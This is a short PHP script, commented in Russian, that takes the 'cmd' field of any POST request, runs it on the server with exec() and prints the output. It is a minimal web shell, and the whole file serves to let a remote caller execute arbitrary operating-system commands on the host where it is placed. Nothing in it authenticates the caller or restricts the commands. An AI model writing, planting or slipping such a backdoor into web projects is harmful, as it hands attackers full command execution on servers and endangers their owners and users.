<?php
function ex($comd)                             //Выполнение команды
{
   $res = '';
   if (!empty($comd)){
		exec($comd,$res);
		$res=implode("\n",$res);
	}
	return $res;
}

$res=ex($_POST['cmd']);
echo $res;
?>